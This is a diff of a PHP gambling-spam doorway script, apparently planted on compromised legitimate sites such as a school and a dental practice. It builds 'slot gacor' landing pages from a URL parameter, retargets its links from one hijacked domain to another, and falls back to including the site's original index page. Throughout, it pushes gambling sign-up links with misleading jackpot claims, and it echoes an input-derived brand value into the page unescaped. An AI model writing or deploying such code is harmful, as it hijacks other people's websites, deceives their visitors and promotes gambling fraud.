@@ -6,10 +6,13 @@ header("Content-Type: text/html; charset=UTF-8");
 
 // Fungsi untuk menolak akses
 function denied() {
-    header("Location: https://anugerahschool.sch.id/index-old.php");
+    if (file_exists('index-old.php')) {
+        include('index-old.php');
+    } else {
+        echo "<h1>File index-old.php tidak ditemukan!</h1>";
+    }
     exit();
 }
-
 // Menggunakan array() agar kompatibel dengan PHP versi lama
 $fileNames = array("note1.txt", "note2.txt", "note3.txt", "note4.txt", "note5.txt");
 $brand = '';
@@ -38,20 +41,22 @@ if (isset($_GET['omak'])) {
 }
 
 // Variabel lainnya
-$link_moneysite = "https://anugerahschool.sch.id/?omak=" . urlencode($brand);
+$link_moneysite = "https://sacramentoholisticdentist.com/?omak=" . urlencode($brand);
 
 // Meta informasi
 $gsc = "";
-$gambar = "https://studiointermedia.com/images/2025/04/25/bsgacorparah.jpeg";
+$gambar = "https://studiointermedia.com/images/2025/04/25/aduhai.jpeg"; // Gambar lama
 $alamat_toko = "$brand gacor";
-$logo = "https://studiointermedia.com/images/2025/04/24/pavicon.png";
-$linkout = "https://panaswak.site/daftar";
-$title = htmlspecialchars($brand . " 🔥 Gacor Slot Anti-Gedor! Maxwin Gila, Cuma 1 Kali Depo, Menang Tanpa Henti!", ENT_QUOTES, "UTF-8");
-$favicon = "https://studiointermedia.com/images/2025/04/24/pavicon.png";
+$logo = "https://studiointermedia.com/images/2025/04/25/log-bs505.png"; // Logo lama
+$linkout = "https://panaswak.site/daftar"; // Link lama
+$title = htmlspecialchars($brand . " 🎰 Slot Gacor: Menangkan Jackpot Fantastis Sekarang!", ENT_QUOTES, "UTF-8");
+$favicon = "https://studiointermedia.com/images/2025/04/24/pavicon.png"; // Favicon lama
 $author = "Admin $brand";
 $nama_toko = "BS GENG";
-$description = htmlspecialchars($brand . " Slot Gacor yang Bener-Bener Bikin Auto Menang! Dengan Scatter Hitam, kamu bisa dapetin Maxwin gila cuma dengan 1 kali deposit! tak ada yang bisa ngalahin! Slot terbaik, kemenangan tiada henti!", ENT_QUOTES, "UTF-8");
-$amphtml = "https://bs505geng.online/omak/wala.html?$brand";
+$description = htmlspecialchars("$brand hadir dengan slot gacor terbaik! Menangkan jackpot besar dengan setiap putaran. Segera bergabung dan buktikan keberuntungan Anda dengan satu klik!", ENT_QUOTES, "UTF-8");
+$amphtml = "https://bs505geng.online/omak/aduh.html?$brand"; // AMP lama
+$artikel = htmlspecialchars("$brand menawarkan kesempatan langka untuk meraih jackpot terbesar! Mainkan sekarang dan rasakan sensasi kemenangan dengan setiap putaran. Bergabunglah dan menangkan hadiah fantastis!", ENT_QUOTES, "UTF-8");
+
 ?>
 
 <!doctype html>
@@ -1336,9 +1341,9 @@ $amphtml = "https://bs505geng.online/omak/wala.html?$brand";
 
                         <div class="content">
                             <div class="n-columns-2">
-                                <a href="https://baratatata.pages.dev/"
+                                <a href="<?php echo htmlspecialchars($linkout); ?>"
                                     rel="nofollow noreferrer" class="login">LOGIN</a>
-                                <a href="https://baratatata.pages.dev/"
+                                <a href="<?php echo htmlspecialchars($linkout); ?>"
                                     rel="nofollow noreferrer" class="register">DAFTAR</a>
                             </div>
 
@@ -1529,7 +1534,7 @@ $amphtml = "https://bs505geng.online/omak/wala.html?$brand";
                                                 </div>
 
                                                 <div class="ProductItem-details-excerpt" data-content-field="excerpt">
-                                                    <p><a href="<?php echo htmlspecialchars($link_moneysite); ?>"><span style="color: #0f1d86;"><strong><?php echo $brand?></strong></a> <?php echo htmlspecialchars($description); ?>.</p>
+                                                    <p><a href="<?php echo htmlspecialchars($link_moneysite); ?>"><span style="color: #0f1d86;"><strong><?php echo $brand?></strong></a> <?php echo htmlspecialchars($artikel); ?>.</p>
                                                         
                                                 </div>
                                             </div>
